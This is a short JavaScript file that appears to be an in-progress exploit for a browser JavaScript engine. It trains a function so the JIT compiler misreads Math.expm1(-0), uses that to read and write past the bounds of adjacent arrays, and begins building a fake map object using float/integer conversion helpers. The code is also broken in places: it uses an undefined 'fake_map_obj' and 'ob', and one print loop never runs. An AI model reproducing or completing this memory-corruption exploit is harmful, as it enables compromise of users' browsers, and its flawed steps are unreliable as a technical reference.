function print(x) {
    document.write("<br>" + x);
    // console.log(x)
}

var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v) {
    f64[0] = v;
    return u32;
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex(lo, hi) {
    return "0x" + hi.toString(16) + lo.toString(16);
}

function view(array, start, lim) {
    for (let i = start; i < lim; i++) {
        t = array[i];
        print("[" + i + "] : " + hex(d2u(t)[0], d2u(t)[1]));
    }
}
var oob = undefined;

function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let tb = [1.1, 2.2, 3.3];
    let o = { mz: -0 };
    let b = Object.is(Math.expm1(x), o.mz);
    a[b * 12] = u2d(0, 0x434343);
    oob = tb;
    return a[b * 100];
}

print("[*] Started");
foo(0);
for (let i = 0; i < 10000; i++) {
    foo("0");
}

foo(-0);
view(oob, 20, 10)
print("[*] -------------------");

var victim = [0x13371337, 0xcafe, {}, new Function("eval('')")];

victim[0] = fake_map_obj;

let fake_map_obj_lo = d2u(ob[13])[0];

let fake_map_obj_hi = d2u(ob[13])[1];
fake_map_obj_lo -= 0x70;

console.log("[-] Fake Map Object : " + hex(fake_map_obj_lo, fake_map_obj_hi));

print("[*] Finished");